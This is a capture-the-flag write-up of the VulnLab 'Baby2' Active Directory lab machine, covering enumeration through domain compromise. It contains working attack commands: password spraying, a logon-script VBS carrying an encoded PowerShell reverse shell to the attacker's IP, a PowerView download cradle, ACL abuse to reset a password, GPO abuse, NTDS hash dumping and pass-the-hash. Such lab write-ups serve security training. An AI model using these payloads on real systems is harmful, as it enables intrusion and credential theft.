---
title: "Baby2 VulnHub WriteUp"
date: 2025-04-16 01:37:00 +/-0000
categories: [VulnLab, Active Directory]
tags: [active directory, gpoabuse, baby2]    # TAG names should always be lowercase
description: Baby2 is a medium level machine running on Windows Server. It contains a vulnerable GPO setting that allows us to escalate privileges to Domain Admin
comments: true
image: /assets/img/posts/baby2/1.png
---


| Platform | VulnLab | 
|-------|--------|
| Target IP | 10.10.127.159 | 
| OS | Windows | 
| Severity | Medium | 


## Enumeration

First things first, we’ll add the target’s hostname (resolving to its IP) to `/etc/hosts`. I prefer using `nxc` (NetExec) for this—it’s a tool I’m comfortable with.

```bash
sudo nxc smb 10.10.127.159 --generate-hosts-file /etc/hosts
```

![](/assets/img/posts/baby2/2.png)


As usual let's kickstart our enumeration with the one and only `nmap` tool, which resulted the following. 

```bash
nmap -sC -sV -Pn 10.10.127.159  --open -oA nmap_scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 10:16 IST
Nmap scan report for DC (10.10.127.159)
Host is up (0.16s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-16 04:47:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-04-16T04:33:52
|_Not valid after:  2026-04-16T04:33:52
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-04-16T04:33:52
|_Not valid after:  2026-04-16T04:33:52
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-04-16T04:33:52
|_Not valid after:  2026-04-16T04:33:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-04-16T04:33:52
|_Not valid after:  2026-04-16T04:33:52
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-16T04:48:50+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-16T04:48:10+00:00
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-04-15T04:42:53
|_Not valid after:  2025-10-15T04:42:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2025-04-16T04:48:11
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.03 seconds
```

Classic combo: `139` + `445` open = instant SMB hype. Let’s go loot some shares!

I tried the unauthenticated share enumeration using the nxc with guest user account.

```bash
nxc smb baby2.vl -u 'guest' -p '' --shares
```

![](/assets/img/posts/baby2/3.jpg)


Interesting shares: `docs` , `homes` and `apps`

Since I never learned the syntax of smbclient I used the [smbclient-ng](https://github.com/p0dalirius/smbclient-ng) a better version of smbclient. 

```bash
smbclientng -d "baby2.vl" -u "Guest" -p '' --host 10.10.127.159
```
![](/assets/img/posts/baby2/4.png)

I found that the `homes` share had some directories which looked like potential usernames.

Next, I copied this output to a file and used the following commands to create a clean list of users. We can use this list of users to create a username wordlist, and password spray each account by using the username as password:

![](/assets/img/posts/baby2/5.jpg)

Now let's do a pass spray using the `nxc` with the same list as username and password both. 

```bash
nxc smb baby2.vl -u clean_users -p clean_users --continue-on-success
```

![](/assets/img/posts/baby2/6.jpg)

we have 2 valid hits!

This gave us access to the users: `Carl.Moore`, `library`

```bash
SMB         10.10.127.159   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
SMB         10.10.127.159   445    DC               [+] baby2.vl\library:library
```

## Initial Access

I enumerated the shares belonging to the `Carl.Moore` user.

```bash
smbclientng -d "baby2.vl" -u "Carl.Moore" -p 'Carl.Moore' --host 10.10.127.159
```

![](/assets/img/posts/baby2/7.jpg)

Inside `SYSVOL`, there was a folder called `scripts` containing a `login.vbs` file that had write permissions, meaning we could modify it.

> The `login.vbs` file is a Domain Logon Script, which in Active Directory environments is designed to execute when users log in - exactly as the name suggests. We can exploit this by altering the contents of login.vbs to a VBS script that downloads and executes in memory and get reverse PowerShell shell.

Created the malicious `login.vbs` script with the below content. I used the windows powershell base64 payload from the revshells.com.

```powershell
Set oShell = CreateObject("Wscript.Shell")
oShell.run "powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADYALgAzADYAIgAsADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

I just replaced the original `login.vbs` script with our malicious `login.vbs` script as follows:

![](/assets/img/posts/baby2/9.jpeg)


Waited for few moment and I got the shell as `baby2\amelia.griffiths` user. 

![](/assets/img/posts/baby2/10.jpg)


## Privilege Escalation

Since this user did not have much privileges I took a step back and did the enumeration again with the `Carl.Moore` user and collected the information using rusthound (better and fast collector). 

![](/assets/img/posts/baby2/11.jpg)

Uploaded the zip to the bloodhound-ce and marked the `Amellia.Griffiths` user aand found the further path to the domain admin. 

![](/assets/img/posts/baby2/12.jpg)

Since the Amelia is a member of Legacy group & it has `WriteDacl` right over `GPOADM` user, it could change it's password. 

but we have to keep one thing in mind that we have amelia.griffiths as reverse shell we dont have her password , so to exploit WriteDacl we cant use linux tools such as impacket/BloodyAD !

So I went through the powershell way and uploaded the `powerview.ps1` file to the rev shell we have.

Imported the powerview.ps1 file using the below cradle. 

```powershell
PS C:\Users\Amelia.Griffiths> IEX (New-Object Net.Webclient).downloadstring("http://10.8.6.36:8080/PowerView.ps1")
```

![](/assets/img/posts/baby2/13.jpg)

I further used the following commands in order to change the `gpoadm` user's password. 

```powershell
add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
$cred = ConvertTo-SecureString 'SidWasHere123!' -AsPlainText -Force
set-domainuserpassword gpoadm -accountpassword $cred
```

![](/assets/img/posts/baby2/14.jpg)

Further Login with the updated credential was possible as shown in the screenshot below. I used the `nxc` again to verify this. 

```bash
nxc smb baby2.vl -u 'gpoadm' -p 'SidWasHere123!'
```
![](/assets/img/posts/baby2/15.jpg)

so at this point we have pwned user `gpoadm` user now lets go back to bloodhound & mark it as owned & see from here where we can move.

![](/assets/img/posts/baby2/16.jpg)

We noticed that the **GPOADM** account has *GenericAll* privileges on the **Default Domain Controllers Policy**. As BloodHound suggests, we can exploit this using `pyGPOAbuse.py`. 

First, we need to locate the policy’s *GPO File Path ID*.

![](/assets/img/posts/baby2/17.jpg)

```bash
Gpcpath:
\\baby2.vl\sysvol\baby2.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
```

Here the gpo-id will be `31B2F340-016D-11D2-945F-00C04FB984F9`.

Now we can use [pygpoabuse.py](https://github.com/Hackndo/pyGPOAbuse) to add the gpoadm user into the administrator group.

```bash
python3 pygpoabuse.py 'baby2.vl/gpoadm:SidWasHere123!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -f -dc-ip 10.10.127.159 -command 'net localgroup administrators /add gpoadm'
```

![](/assets/img/posts/baby2/18.jpg)

Despite some error it added my user to the local administrators group. 

Since our `gpoadm` user is now part of administrator, we can further dump the sam or ntlm hases. I used the `nxc` but tools like secretsdump could also be used. 

```bash
 nxc smb baby2.vl -u 'gpoadm' -p 'SidWasHere123!' --ntds
 ```

![](/assets/img/posts/baby2/19.jpg)

## Final Flag

Now that we have the Administrator user’s hashes, we can perform a Pass‑the‑Hash attack to spawn a reverse shell as Administrator. I used `psexec.py` because my Evil‑WinRM setup on macOS was not functioning properly.

![](/assets/img/posts/baby2/20.jpg)

Finally, we can grab the flag from the Desktop of the Administrator user.